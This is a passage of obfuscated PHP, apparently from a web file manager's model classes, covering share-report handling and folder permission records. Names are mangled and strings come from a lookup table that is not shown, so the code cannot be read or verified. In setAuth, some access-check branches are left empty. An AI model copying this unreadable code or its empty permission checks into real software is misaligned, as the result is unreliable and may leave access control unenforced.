!$”ªÜâ[$ê‘©Ÿâ¿[100]]) { unset($Äú¯±Ìğ[$Ô¹‹–…ˆ]); } } unset($”ªÜâ); $Äú¯±Ìğ = array_values($Äú¯±Ìğ); } private function _makeOrder($ï›§¹— = '') { $ØôÂÊø‹ =& $_SERVER[÷ôÚîå]; $èĞ¥âØ = array($ØôÂÊø‹[241], $ØôÂÊø‹[850], $ØôÂÊø‹[2141], $ØôÂÊø‹[2142]); $Ù¸º‚÷” = array($ØôÂÊø‹[532] => $ØôÂÊø‹[533], $ØôÂÊø‹[534] => $ØôÂÊø‹[535]); $Ê—ıÓ†÷ = Input::get($ØôÂÊø‹[539], $ØôÂÊø‹[7], $ØôÂÊø‹[506], $èĞ¥âØ); $ä³’Ä÷ş = Input::get($ØôÂÊø‹[540], $ØôÂÊø‹[7], $ØôÂÊø‹[2155], array($ØôÂÊø‹[2073], $ØôÂÊø‹[534])); $ä³’Ä÷ş = $Ù¸º‚÷”[$ä³’Ä÷ş]; $ï›§¹— = $ï›§¹— . "{$Ê—ıÓ†÷}\x20{$ä³’Ä÷ş}"; return $this->order($ï›§¹—); } public function reportAdd($Ü±Á±ûü) { $¥ñİòŒ =& $_SERVER[÷ôÚîå]; $ó«óËõæ = array($¥ñİòŒ[674] => $Ü±Á±ûü[$¥ñİòŒ[674]], $¥ñİòŒ[1779] => USER_ID); if (Model($¥ñİòŒ[2151])->where($ó«óËõæ)->find()) { return !1; } $–˜ß©´‘ = array($¥ñİòŒ[674] => $Ü±Á±ûü[$¥ñİòŒ[674]], $¥ñİòŒ[1668] => $Ü±Á±ûü[$¥ñİòŒ[1668]], $¥ñİòŒ[203] => $Ü±Á±ûü[$¥ñİòŒ[203]], $¥ñİòŒ[550] => $Ü±Á±ûü[$¥ñİòŒ[550]], $¥ñİòŒ[1779] => USER_ID, $¥ñİòŒ[33] => $Ü±Á±ûü[$¥ñİòŒ[33]], $¥ñİòŒ[535] => $Ü±Á±ûü[$¥ñİòŒ[535]]); return Model($¥ñİòŒ[2151])->add($–˜ß©´‘); } public function reportList($ù±…·½) { $”ÌÆ°‚ =& $_SERVER[÷ôÚîå]; $º²•“Í = array(); if ($ù±…·½[$”ÌÆ°‚[849]]) { $àŸÑƒ£î = $ù±…·½[$”ÌÆ°‚[850]] ? $ù±…·½[$”ÌÆ°‚[850]] : strtotime(date($”ÌÆ°‚[2153])); $º²•“Í[$”ÌÆ°‚[241]] = array($”ÌÆ°‚[418], array($ù±…·½[$”ÌÆ°‚[849]], $àŸÑƒ£î)); } if (isset($ù±…·½[$”ÌÆ°‚[33]]) && in_array($ù±…·½[$”ÌÆ°‚[33]], array($”ÌÆ°‚[101], $”ÌÆ°‚[519], $”ÌÆ°‚[2156], $”ÌÆ°‚[2157], $”ÌÆ°‚[2158]))) { $º²•“Í[$”ÌÆ°‚[33]] = $ù±…·½[$”ÌÆ°‚[33]]; } if (isset($ù±…·½[$”ÌÆ°‚[839]]) && in_array($ù±…·½[$”ÌÆ°‚[839]], array($”ÌÆ°‚[238], $”ÌÆ°‚[101], $”ÌÆ°‚[519], $”ÌÆ°‚[2156]))) { $º²•“Í[$”ÌÆ°‚[839]] = $ù±…·½[$”ÌÆ°‚[839]]; } $ïùª½š¤ = Input::get($”ÌÆ°‚[540], $”ÌÆ°‚[7], $”ÌÆ°‚[2155], array($”ÌÆ°‚[2073], $”ÌÆ°‚[534])); $˜™×å´Ì = array($”ÌÆ°‚[532] => $”ÌÆ°‚[533], $”ÌÆ°‚[534] => $”ÌÆ°‚[535]); $”û÷¿„¯ = $”ÌÆ°‚[2159] . $˜™×å´Ì[$ïùª½š¤]; $•¿™²”· = Model($”ÌÆ°‚[2151])->where($º²•“Í)->order($”û÷¿„¯)->selectPage(20); if (empty($•¿™²”·[$”ÌÆ°‚[454]])) { return array(); } $ÛÌàãşó = array_to_keyvalue_group($•¿™²”·[$”ÌÆ°‚[454]], $”ÌÆ°‚[839], $”ÌÆ°‚[674]); if (!empty($ÛÌàãşó[0])) { $ù±…·½ = $ÛÌàãşó[0]; $º²•“Í = array($”ÌÆ°‚[674] => array($”ÌÆ°‚[7], $ù±…·½)); $Ğß÷Ù»² = $this->where($º²•“Í)->field($”ÌÆ°‚[674])->select(); $Ğß÷Ù»² = array_to_keyvalue($Ğß÷Ù»², $”ÌÆ°‚[12], $”ÌÆ°‚[674]); $ƒô»è…° = array_diff($ù±…·½, $Ğß÷Ù»²); if (!empty($ƒô»è…°)) { foreach ($•¿™²”·[$”ÌÆ°‚[454]] as $’¢êûõñ => $šÅÛ¡ŞÓ) { if (in_array($šÅÛ¡ŞÓ[$”ÌÆ°‚[674]], $ƒô»è…°)) { unset($•¿™²”·[$”ÌÆ°‚[454]][$’¢êûõñ]); } } } } $this->_listDataApply($•¿™²”·[$”ÌÆ°‚[454]]); return $•¿™²”·; } public function reportStatus($§‡·å²”) { $š Öà¡ø =& $_SERVER[÷ôÚîå]; $Ò“ÛÇ§¹ = array($š Öà¡ø[484] => $§‡·å²”[$š Öà¡ø[484]]); $«ğ°êİİ = Model($š Öà¡ø[2151])->where($Ò“ÛÇ§¹)->field($š Öà¡ø[2160])->find(); if (!$«ğ°êİİ) { return !1; } $³´²û’ä = array($š Öà¡ø[839] => $§‡·å²”[$š Öà¡ø[839]]); if ($§‡·å²”[$š Öà¡ø[839]] == $š Öà¡ø[2156] && $«ğ°êİİ[$š Öà¡ø[839]] == $š Öà¡ø[2156]) { $³´²û’ä[$š Öà¡ø[839]] = 0; } $Š±Æ³óŸ = Model($š Öà¡ø[2151])->where($Ò“ÛÇ§¹)->save($³´²û’ä); if ($§‡·å²”[$š Öà¡ø[839]] == $š Öà¡ø[519]) { if ($«ğ°êİİ[$š Öà¡ø[550]] != $š Öà¡ø[238] && $this->shareFileMeta($«ğ°êİİ[$š Öà¡ø[550]])) { $this->shareFileMeta($«ğ°êİİ[$š Öà¡ø[550]], 0); } $this->remove($«ğ°êİİ[$š Öà¡ø[674]]); return !0; } if ($Š±Æ³óŸ && $§‡·å²”[$š Öà¡ø[839]] == $š Öà¡ø[2156]) { $¤¿ÎÛêÈ = $³´²û’ä[$š Öà¡ø[839]] == $š Öà¡ø[2156] ? 1 : 0; $this->shareFileMeta($«ğ°êİİ[$š Öà¡ø[550]], $¤¿ÎÛêÈ); $this->removeByFile($«ğ°êİİ[$š Öà¡ø[550]]); } return $Š±Æ³óŸ; } private function removeByFile($±ÒÑÙ†ä) { $†İ–‘åÏ =& $_SERVER[÷ôÚîå]; $¼ÁÖ¼êë = Model($†İ–‘åÏ[914])->where(array($†İ–‘åÏ[550] => $±ÒÑÙ†ä))->field($†İ–‘åÏ[203])->select(); $¨£º…ıí = array_to_keyvalue($¼ÁÖ¼êë, $†İ–‘åÏ[12], $†İ–‘åÏ[203]); $Äöğü¹¹ = array($†İ–‘åÏ[203] => array($†İ–‘åÏ[7], $¨£º…ıí), $†İ–‘åÏ[571] => 1); $¼ÁÖ¼êë = $this->where($Äöğü¹¹)->field($†İ–‘åÏ[674])->select(); if (empty($¼ÁÖ¼êë)) { return; } $¢®ÍÆ = array_to_keyvalue($¼ÁÖ¼êë, $†İ–‘åÏ[12], $†İ–‘åÏ[674]); $this->remove($¢®ÍÆ); } private function shareFileMeta($¥Ñòõà, $¯òë–ÒŞ = null) { $–ì‘Ñ¿ã =& $_SERVER[÷ôÚîå]; $·€ØĞ¾ü = array($–ì‘Ñ¿ã[550] => $¥Ñòõà, $–ì‘Ñ¿ã[107] => $–ì‘Ñ¿ã[2161]); if (is_null($¯òë–ÒŞ)) { return Model($–ì‘Ñ¿ã[2162])->where($·€ØĞ¾ü)->find(); } $·€ØĞ¾ü[$–ì‘Ñ¿ã[459]] = $¯òë–ÒŞ; Model($–ì‘Ñ¿ã[2162])->add($·€ØĞ¾ü, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\151\x6f\x5f\x73\157\165\162\x63\145\x5f\x61\165\164\150"; public function getAuth($èäÒçà) { $Àßá‹Ãû =& $_SERVER[÷ôÚîå]; $¤³Ú¬ = $this->sourceAuthSelect($èäÒçà); $´öë¬½² = array(); $ğåœáÎ = array(); $“ÙÒš = 2 << 25; foreach ($¤³Ú¬ as $£ÜˆíüÌ) { $¨—â÷åà = Model($Àßá‹Ãû[580])->listData($£ÜˆíüÌ[$Àßá‹Ãû[2086]]); if (!$¨—â÷åà) { continue; } $´öë¬½²[] = $£ÜˆíüÌ; $¯»ôíÉì = 0; if ($£ÜˆíüÌ[$Àßá‹Ãû[200]] == SourceModel::TYPE_GROUP) { $¯»ôíÉì = $“ÙÒš * 2; } if ($£ÜˆíüÌ[$Àßá‹Ãû[200]] == SourceModel::TYPE_USER) { $¯»ôíÉì = $“ÙÒš; } if ($£ÜˆíüÌ[$Àßá‹Ãû[200]] == SourceModel::TYPE_USER && $£ÜˆíüÌ[$Àßá‹Ãû[578]] == $Àßá‹Ãû[238]) { $¯»ôíÉì = 0; } $ğåœáÎ[] = $¨—â÷åà[$Àßá‹Ãû[496]] + $¯»ôíÉì; } array_multisort($ğåœáÎ, SORT_DESC, $´öë¬½²); return $´öë¬½²; } public function sourceAuthSelect($³ËáĞ§–) { $ ı¹±õı =& $_SERVER[÷ôÚîå]; static $‚ÀœÊ¬İ = array(); $¿úûÛÑ  = is_array($³ËáĞ§–) ? !1 : !0; if ($¿úûÛÑ ) { $³ËáĞ§– = array($³ËáĞ§–); } $°éŸš÷ = array(); foreach ($³ËáĞ§– as $ÁÏê±Èñ) { if (isset($‚ÀœÊ¬İ[$ÁÏê±Èñ])) { $°éŸš÷[$ÁÏê±Èñ] = $‚ÀœÊ¬İ[$ÁÏê±Èñ]; } } if (count($°éŸš÷) == count($³ËáĞ§–)) { return $¿úûÛÑ  ? $°éŸš÷[$³ËáĞ§–[0]] : $°éŸš÷; } $Ëä‹ƒñù = $ ı¹±õı[2163]; $Å¥ØüÇˆ = array($ ı¹±õı[203] => array($ ı¹±õı[7], $³ËáĞ§–)); $¹¿íôüô = $this->field($Ëä‹ƒñù)->order($ ı¹±õı[484])->where($Å¥ØüÇˆ)->select(); $±î÷Á¤¬ = array_to_keyvalue_group($¹¿íôüô, $ ı¹±õı[203]); foreach ($³ËáĞ§– as $ÁÏê±Èñ) { $‚ÀœÊ¬İ[$ÁÏê±Èñ] = $±î÷Á¤¬[$ÁÏê±Èñ] ? $±î÷Á¤¬[$ÁÏê±Èñ] : array(); } if ($¿úûÛÑ ) { return $¹¿íôüô; } return $±î÷Á¤¬; } public function setAuth($ïõÒîä, $¹éëÏåÑ) { $®¥´Šİ =& $_SERVER[÷ôÚîå]; $èÀò¿™ğ = Model($®¥´Šİ[1429])->sourceInfo($ïõÒîä); if (!$èÀò¿™ğ) { return !1; } if ($èÀò¿™ğ[$®¥´Šİ[200]] != SourceModel::TYPE_GROUP) { return !1; } $ÓÁØâî = 1; $Ø÷»¥€£ = $èÀò¿™ğ[$®¥´Šİ[578]]; if ($Ø÷»¥€£ != $ÓÁØâî) { $Ô˜ÆŸ = array($®¥´Šİ[1978] => $Ø÷»¥€£); $’ŞÁë±Ó = Model($®¥´Šİ[2072])->field($®¥´Šİ[1779])->where($Ô˜ÆŸ)->select(); $’ŞÁë±Ó = array_to_keyvalue($’ŞÁë±Ó, $®¥´Šİ[12], $®¥´Šİ[1779]); } $ƒÏç÷Œã = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $ã´‘°™  = array(); foreach ($¹éëÏåÑ as $´’ş¬à) { if (!in_array($´’ş¬à[$®¥´Šİ[200]], $ƒÏç÷Œã)) { show_json(LNG($®¥´Šİ[2164]), !1); } if ($Ø÷»¥€£ != $ÓÁØâî) { if ($´’ş¬à[$®¥´Šİ[200]] == SourceModel::TYPE_GROUP) { } if ($´’ş¬à[$®¥´Šİ[578]] != 0 && !in_array($´’ş¬à[$®¥´Šİ[578]], $’ŞÁë±Ó)) { } } if ($´’ş¬à[$®¥´Šİ[578]] == 0) { $´’ş¬à[$®¥´Šİ[200]] = SourceModel::TYPE_USER; } $ã´‘°™ [] = array($®¥´Šİ[203] => $ïõÒîä, $®¥´Šİ[200] => intval($´’ş¬à[$®¥´Šİ[200]]), $®¥´Šİ[578] => intval($´’ş¬à[$®¥´Šİ[578]]), $®¥´Šİ[2086] => intval($´’ş¬à[$®¥´Šİ[2086]]) ? intval($´’ş¬à[$®¥´Šİ[2086]]) : 0, $®¥´Šİ[2146] => intval($´’ş¬à[$®¥´Šİ[2146]]) ? intval($´’ş¬à[$®¥´Šİ[2146]]) : -1); } $this->where(array($®¥´Šİ[500] => $ïõÒîä))->delete(); $this->addAll($ã´‘°™ ); return !0; } public function authClear($­ı¯®ª) { $½åİÍ·ä =& $_SERVER[÷ôÚîå]; $¦ÁÚ¨°¡ = Model($½åİÍ·ä[1429])->sourceInfo($­ı¯®ª); $Å•°†Û = array($­ı¯®ª); if ($¦ÁÚ¨°¡[$½åİÍ·ä[494]] == $½åİÍ·ä[101]) { $Õâ ŠÂµ = array($½åİÍ·ä[661] => array($½åİÍ·ä[621], $¦ÁÚ¨°¡[$½åİÍ·ä[593]] . $­ı¯®ª . $½åİÍ·ä[622])); $Å•°†Û = Model($½åİÍ·ä[1429])->field($½åİÍ·ä[500])->where($Õâ ŠÂµ)->getField($½åİÍ·ä[203], !0); $Å•°†Û[] = $­ı¯®ª; } $this->where(array($½åİÍ·ä[500] => array($½åİÍ·ä[501], $Å•°†Û)))->delete(); return !0; } public function getAllChildren($ê†°°€«) { $èÑıÓë½ =& $_SERVER[÷ôÚîå]; $×íÙü·Å = Model($èÑıÓë½[1429])->sourceInfo($ê†°°€«); if ($×íÙü·Å[$èÑıÓë½[494]] != $èÑıÓë½[101]) { return $this->sourceListAuth(array($ê†°°€«)); } if ($×íÙü·Å[$èÑıÓë½[200]] != SourceModel::TYPE_GROUP) { return array(); } $«÷¤¤Ù = 1; $ê«ÏÜ¹ğ = array($ê†°°€«); if ($×íÙü·Å[$èÑıÓë½[202]] == $èÑıÓë½[238] && $×íÙü·Å[$èÑıÓë½[578]] != $«÷¤¤Ù) { $ê«ÏÜ¹ğ = $this->groupChidldAllRootSource($×íÙü·Å[$èÑıÓë½[578]]); } $Œòº¦ÙÉ = $this->field($èÑıÓë½[203])->group($èÑıÓë½[203])->select(); $Œòº¦ÙÉ = array_to_keyvalue($Œòº¦ÙÉ, $èÑıÓë½[12], $èÑıÓë½[203]); if (!$Œòº¦ÙÉ) { return array(); } $äó¶ÁÂ = $èÑıÓë½[2165]; $÷Ğó«®½ = array($èÑıÓë½[203] => array($èÑıÓë½[7], $Œòº¦ÙÉ), $èÑıÓë½[514] => $èÑıÓë½[238]); $›±½Ù•é = Model($èÑıÓë½[914])->field($äó¶ÁÂ)->where($÷Ğó«®½)->select(); $Ùß”£Ïè = array($ê†°°€«); foreach ($›±½Ù•é as $óâ¢Æ) { foreach ($ê«ÏÜ¹ğ as $™¦ËÔ÷) { $úÍµÙÏ = $èÑıÓë½[50] . $™¦ËÔ÷ . $èÑıÓë½[50]; $·Ï•‹°Ö = $óâ¢Æ[$èÑıÓë½[593]] . $óâ¢Æ[$èÑıÓë½[203]] . $èÑıÓë½[50]; if (strstr($·Ï•‹°Ö, $úÍµÙÏ)) { $Ùß”£Ïè[] = $óâ¢Æ[$èÑıÓë½[203]]; break; } } } return $this->sourceListAuth($Ùß”£Ïè); } private function sourceListAuth($ğàû±ĞÈ) { $¤‘ìàÂ€ =& $_SERVER[÷ôÚîå]; $œé¬úÚ = Model($¤‘ìàÂ€[1429])->sourceListInfo($ğàû±ĞÈ, !0); $Ÿ’‚Úø = $this->sourceAuthSelect($ğàû±ĞÈ); $©¯›¬ôÇ = array(); $æ¾ÑÂÓ = array(); foreach ($œé¬úÚ as $–Ò ²) { unset($–Ò ²[$¤‘ìàÂ€[538]]); unset($–Ò ²[$¤‘ìàÂ€[536]]); unset($–Ò ²[$¤‘ìàÂ€[496]]); unset($–Ò ²[$¤‘ìàÂ€[100]]); $ÑñíÆ‘ = $Ÿ’‚Úø[$–Ò ²[$¤‘ìàÂ€[203]]]; if (!$ÑñíÆ‘) { continue; } $–Ò ²[$¤‘ìàÂ€[2166]] = $this->authTargetInfo($ÑñíÆ‘); $–Ò ²[$¤‘ìàÂ€[591]] = rtrim($–Ò ²[$¤‘ìàÂ€[597]], $¤‘ìàÂ€[8]) . $¤‘ìàÂ€[8] . ltrim($–Ò ²[$¤‘ìàÂ€[591]], $¤‘ìàÂ€[8]); $©¯›¬ôÇ[] = $–Ò ²; $ïù§ÚûÙ = count(explode($¤‘ìàÂ€[8], trim($–Ò ²[$¤‘ìàÂ€[591]], $¤‘ìàÂ€[8]))); $æ¾ÑÂÓ[] = $ïù§ÚûÙ + ($–Ò ²[$¤‘ìàÂ€[33]] == $¤‘ìàÂ€[88] ? 0 : 1000); } array_multisort($æ¾ÑÂÓ, SORT_ASC, $©¯›¬ôÇ); return $©¯›¬ôÇ; } private function groupChidldAllRootSource($œÉ™ÜØò) { $š®üŸúß =& $_SERVER[÷ôÚîå]; $ Íàò¨ = Model($š®üŸúß[2167])->groupChildrenAll($œÉ™ÜØò); $îî·›ª = array($š®üŸúß[202] => 0, $š®üŸúß[578] => array($š®üŸúß[7], $ Íàò¨), $š®üŸúß[200] => SourceModel::TYPE_GROUP); $™”§ÌŸñ = Model($š®üŸúß[914])->field($š®üŸúß[203])->where($îî·›ª)->select(); $™”§ÌŸñ = array_to_keyvalue($™”§ÌŸñ, $š®üŸúß[12], $š®üŸúß[203]); return $™”§ÌŸñ; } private function authTargetInfo($Ô´ˆö¹ú) { $´¤ËƒàÂ =& $_SERVER[÷ôÚîå]; $È“ü•§Ó = array(); $ÀÖÍ¦İ‚ = array(); $í™›¨ø„ = 2 << 25; foreach ($Ô´ˆö¹ú as $°Ößì¦¹) { $›ÖİÍœ€ = Model($´¤ËƒàÂ[580])->listData($°Ößì¦¹[$´¤ËƒàÂ[2086]]); if (!$›ÖİÍœ€) { continue; } if ($°Ößì¦¹[$´¤ËƒàÂ[200]] == SourceModel::TYPE_USER) { $Ü…¿— = Model($´¤ËƒàÂ[586])->getInfoSimpleOuter($°Ößì¦¹[$´¤ËƒàÂ[578]]); if ($Ü…¿—[$´¤ËƒàÂ[1779]] == $´¤ËƒàÂ[1284]) { continue; } if ($Ü…¿—[$´¤ËƒàÂ[1779]] == $´¤ËƒàÂ[238]) { $Ü…¿—[$´¤ËƒàÂ[32]] = LNG($´¤ËƒàÂ[2168]); } } else { $Ü…¿— = Model($´¤ËƒàÂ[594])->getInfoSimple($°Ößì¦¹[$´¤ËƒàÂ[578]]); } if (!$Ü…¿—) { continue; } $Ü…¿—[$´¤ËƒàÂ[549]] = $›ÖİÍœ€; $È“ü•§Ó[] = $Ü…¿—; $À»çğÕä = 0; if ($°Ößì¦¹[$´¤ËƒàÂ[200]] == SourceModel::TYPE_GROUP) { $À»çğÕä = $í™›¨ø„ * 2; } if ($°Ößì¦¹[$´¤ËƒàÂ[200]] == SourceModel::TYPE_USER) { $À»çğÕä = $í™›¨ø„; } if ($°Ößì¦¹[$´¤ËƒàÂ[200]] == SourceModel::TYPE_USER && $°Ößì¦¹[$´¤ËƒàÂ[578]] == $´¤ËƒàÂ[238]) { $À»çğÕä = 0; } $ÀÖÍ¦İ‚[] = $›ÖİÍœ€[$´¤ËƒàÂ[496]] + $À»çğÕä; } array_multisort($ÀÖÍ¦İ‚, SORT_DESC, $È“ü•§Ó); return $È“ü•§Ó; } public function getAllChildrenByUser($‘Šç´Å, $…¡æ ¨¤) { $œ¥‚ìÓ€ =& $_SERVER[÷ôÚîå]; $ÑÉÏÜıÙ = Model($œ¥‚ìÓ€[607])->getInfo($…¡æ ¨¤); if (!$…¡æ ¨¤ || !$‘Šç´Å || !$ÑÉÏÜıÙ) { return array(); } $ùì´ô„â = Model($œ¥‚ìÓ€[1429])->sourceInfo($‘Šç´Å); $·²÷ğçí = array(); $µ‡«–û° = 1; if ($ùì´ô„â[$œ¥‚ìÓ€[202]] == $œ¥‚ìÓ€[238] && $ùì´ô„â[$œ¥‚ìÓ€[578]] != $µ‡«–û° && $this->groupContainUser($ùì´ô„â[$œ¥‚ìÓ€[578]], $…¡æ ¨¤)) { foreach ($ÑÉÏÜıÙ[$œ¥‚ìÓ€[2169]] as $‡í‘ÒÓ÷) { $†ûß§¸­ = Model($œ¥‚ìÓ€[594])->getInfo($‡í‘ÒÓ÷[$œ¥‚ìÓ€[1978]]); $ÂÖÏóëõ = Model($œ¥‚ìÓ€[607])->getInfoSimpleOuter($…¡æ ¨¤); $ÂÖÏóëõ[$œ¥‚ìÓ€[549]] = $‡í‘ÒÓ÷[$œ¥‚ìÓ€[496]]; if (Model($œ¥‚ìÓ€[580])->authCheckAction($‡í‘ÒÓ÷[$œ¥‚ìÓ€[496]][$œ¥‚ìÓ€[496]], $œ¥‚ìÓ€[1999])) { continue; } $š’´Ô´å = array($œ¥‚ìÓ€[32] => $œ¥‚ìÓ€[1304] . $†ûß§¸­[$œ¥‚ìÓ€[32]], $œ¥‚ìÓ€[203] => $†ûß§¸­[$œ¥‚ìÓ€[100]][$œ¥‚ìÓ€[203]], $œ¥‚ìÓ€[97] => KodIO::make($†ûß§¸­[$œ¥‚ìÓ€[100]][$œ¥‚ìÓ€[203]]), $œ¥‚ìÓ€[202] => $œ¥‚ìÓ€[238], $œ¥‚ìÓ€[200] => $œ¥‚ìÓ€[587], $œ¥‚ìÓ€[33] => $œ¥‚ìÓ€[625], $œ¥‚ìÓ€[591] => $†ûß§¸­[$œ¥‚ìÓ€[598]], $œ¥‚ìÓ€[1978] => $†ûß§¸­[$œ¥‚ìÓ€[1978]], $œ¥‚ìÓ€[595] => $†ûß§¸­[$œ¥‚ìÓ€[202]], $œ¥‚ìÓ€[2166] => array($ÂÖÏóëõ)); $·²÷ğçí[$š’´Ô´å[$œ¥‚ìÓ€[203]]] = $š’´Ô´å; } } $İÀâà®» = array(); $‘Ô‚µã— = $this->getAllChildren($‘Šç´Å); foreach ($‘Ô‚µã— as $İ•ˆÂ¯Á) { $Ç·½Í¡Û = !1; foreach ($İ•ˆÂ¯Á[$œ¥‚ìÓ€[2166]] as $ŞÌÎƒ­Ã) { if ($ŞÌÎƒ­Ã[$œ¥‚ìÓ€[1779]]) { if ($ŞÌÎƒ­Ã[$œ¥‚ìÓ€[1779]] == $…¡æ ¨¤) { $Ç·½Í¡Û = !0; break; } } if ($ŞÌÎƒ­Ã[$œ¥‚ìÓ€[1978]]) { if ($this->groupContainUser($ŞÌÎƒ­Ã[$œ¥‚ìÓ€[1978]], $…¡æ ¨¤)) { $Ç·½Í¡Û = !0; break; } } } if ($Ç·½Í¡Û) { $İÀâà®»[] = $İ•ˆÂ¯Á; } $¨Ê¨ ƒ£ = $İ•ˆÂ¯Á[$œ¥‚ìÓ€[203]]; if (isset($·²÷ğçí[$¨Ê¨ ƒ£])) { $İ•ˆÂ¯Á[$œ¥‚ìÓ€[2166]][] = $·²÷ğçí[$¨Ê¨ ƒ£][0]; $·²÷ğçí[$¨Ê¨ ƒ£] = !1; } } $·²÷ğçí = array_filter(array_values($·²÷ğçí)); $İÀâà®» = array_merge($·²÷ğçí, $İÀâà®»); return $İÀâà®»; } public function setAllChildrenByUser($í“ıÔê, $ò—øÍï, $«çÚ©³‰) { $ùöÉ÷ëç =& $_SERVER[÷ôÚîå]; $Æ£±¿  = $this->getAllChildrenByUser($í“ıÔê, $ò—øÍï); if (!$«çÚ©³‰ || !$Æ£±¿ ) { return !1; } foreach ($Æ£±¿  as $ê”›€¯ñ) { $Óõù÷‘ = array(); foreach ($ê”›€¯ñ[$ùöÉ÷ëç[2166]] as $Š€…”‡Ê) { $š¿ÉÓŠÑ = $Š€…”‡Ê[$ùöÉ÷ëç[549]]; $Â‡ıÙú¿ = $Š€…”‡Ê[$ùöÉ÷ëç[1779]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $û®Î®¤¥ = $Š€…”‡Ê[$ùöÉ÷ëç[1779]] ? $Š€…”‡Ê[$ùöÉ÷ëç[1779]] : $Š€…”‡Ê[$ùöÉ÷ëç[1978]]; if ($Š€…”‡Ê[$ùöÉ÷ëç[1779]] && $Š€…”‡Ê[$ùöÉ÷ëç[1779]] == $ò—øÍï) { continue; } $Óõù÷‘[] = array($ùöÉ÷ëç[203] => $ê”›€¯ñ[$ùöÉ÷ëç[203]], $ùöÉ÷ëç[200] => $Â‡ıÙú¿, $ùöÉ÷ëç[578] => intval($û®Î®¤¥), $ùöÉ÷ëç[2086] => isset($š¿ÉÓŠÑ[$ùöÉ÷ëç[484]]) ? intval($š¿ÉÓŠÑ[$ùöÉ÷ëç[484]]) : 0, $ùöÉ÷ëç[2146] => isset($š¿ÉÓŠÑ[$ùöÉ÷ëç[2146]]) ? intval($š¿ÉÓŠÑ[$ùöÉ÷ëç[2146]]) : -1); } $Óõù÷‘[] = array($ùöÉ÷ëç[203] => $ê”›€¯ñ[$ùöÉ÷ëç[203]], $ùöÉ÷ëç[200] => SourceModel::TYPE_USER, $ùöÉ÷ëç[578] => intval($ò—øÍï), $ùöÉ÷ëç[2086] => intval($«çÚ©³‰), $ùöÉ÷ëç[2146] => -1); $this->where(array($ùöÉ÷ëç[500] => $ê”›€¯ñ[$ùöÉ÷ëç[203]]))->delete(); $this->addAll($Óõù÷‘); } return !0; } public function get($€¡ÂìÔ) { $æÙâ—Û¹ = $this->getSourceList(array($€¡ÂìÔ), !0); return $æÙâ—Û¹[0]; } public function getSourceList($ò ì¼î, $Ô÷¬§Ú† = false, $ï²ñ¼¸Ì = false) { $ñˆ¹Äñ =& $_SERVER[÷ôÚîå]; if (!$ò ì¼î) { return array(); } $Ê°‹¯ÂÉ = Model($ñˆ¹Äñ[1429]); if (!$Ô÷¬§Ú† && count($ò ì¼î) == 1) { $Ô÷¬§Ú† = array(); $Ô÷¬§Ú†[$ò ì¼î[0]] = $Ê°‹¯ÂÉ->sourceInfo($ò ì¼î[0]); } if (!$Ô÷¬§Ú†) { $µ¼ˆ©… = array($ñˆ¹Äñ[500] => array($ñˆ¹Äñ[501], $ò ì¼î)); $Ô÷¬§Ú† = $Ê°‹¯ÂÉ->field($ñˆ¹Äñ[2170])->where($µ¼ˆ©…)->select(); $Ô÷¬§Ú† = array_to_keyvalue($Ô÷¬§Ú†, $ñˆ¹Äñ[203]); } $æ§©ß¹´ = $ò ì¼î; foreach ($Ô÷¬§Ú† as $ÌÕøã·« => $îè•áŸç) { $íöıéØÙ = $Ê°‹¯ÂÉ->parentLevelArray($îè•áŸç[$ñˆ¹Äñ[593]]); $æ§©ß¹´ = array_merge($æ§©ß¹´, array($ÌÕøã·«), array_reverse($íöıéØÙ)); } $æ§©ß¹´ = array_values(array_unique($æ§©ß¹´)); if (!$æ§©ß¹´) { return array(); } $Ä­§Û = $this->sourceAuthSelect($æ§©ß¹´); $•Âİå± = array(); foreach ($æ§©ß¹´ as $’ìÍàĞ‚) { if (isset($Ä­§Û[$’ìÍàĞ‚])) { $•Âİå±[$’ìÍàĞ‚] = $Ä­§Û[$’ìÍàĞ‚]; } } $´ëéÚ³¯ = $this->userIsRoot($ï²ñ¼¸Ì); $¦´Áƒæ£ = AuthModel::authAll(); $³çÛŒäå = array($ñˆ¹Äñ[497] => $¦´Áƒæ£, $ñˆ¹Äñ[2171] => array($ñˆ¹Äñ[502] => 0, $ñˆ¹Äñ[1984] => $¦´Áƒæ£, $ñˆ¹Äñ[503] => LNG($ñˆ¹Äñ[2172]), $ñˆ¹Äñ[2001] => $ñˆ¹Äñ[2173])); $ôİ¥Ğ¡“ = array(); foreach ($Ô÷¬§Ú† as $’ìÍàĞ‚ => $Òğö½ä÷) { if ($´ëéÚ³¯ && $GLOBALS[$ñˆ¹Äñ[6]][$ñˆ¹Äñ[1997]]) { $ôİ¥Ğ¡“[$’ìÍàĞ‚] = $³çÛŒäå; continue; } $ôİ¥Ğ¡“[$’ìÍàĞ‚] = $this->makeSourceAuth($Òğö½ä÷, $•Âİå±, $ï²ñ¼¸Ì); } return $ôİ¥Ğ¡“; } public function authDeepCheck($á—å²±, $»Ìş±¶ = false) { $½Ì¾’ÆÒ =& $_SERVER[÷ôÚîå]; $»Ìş±¶ = $»Ìş±¶ ? $»Ìş±¶ : USER_ID; $ú½øÀÃ¢ = $this->makeAuthDeep($»Ìş±¶); if (!in_array($á—å²±, $ú½øÀÃ¢[$½Ì¾’ÆÒ[2174]])) { return !1; } $¯ä„³å = array(); foreach ($ú½øÀÃ¢[$½Ì¾’ÆÒ[2175]] as $éÆ‰Ø¥ => $Ğ¢Á‘„ô) { if (!in_array($á—å²±, $Ğ¢Á‘„ô)) { continue; } $¯ä„³å[] = $éÆ‰Ø¥; } if (!$¯ä„³å) { return !1; } $êëéëà· = $¯ä„³å ? $¯ä„³å[0] : $á—å²±; return array($½Ì¾’ÆÒ[497] => -1, $½Ì¾’ÆÒ[549] => array($½Ì¾’ÆÒ[502] => $½Ì¾’ÆÒ[1284], $½Ì¾’ÆÒ[1984] => $½Ì¾’ÆÒ[238], $½Ì¾’ÆÒ[503] => LNG($½Ì¾’ÆÒ[2176]), $½Ì¾’ÆÒ[2001] => $½Ì¾’ÆÒ[2177]), $½Ì¾’ÆÒ[2178] => LNG($½Ì¾’ÆÒ[2179]), $½Ì¾’ÆÒ[2180] => $this->sourceAuthInfo($êëéëà·)); } protected function makeAuthDeep($¨é…½¬” = false) { $Óı‹š¤Ï =& $_SERVER[÷ôÚîå]; static $ê§‹ŒæĞ = array(); $¨é…½¬” = $¨é…½¬” ? $¨é…½¬” : USER_ID; if (isset($ê§‹ŒæĞ[$¨é…½¬”])) { return 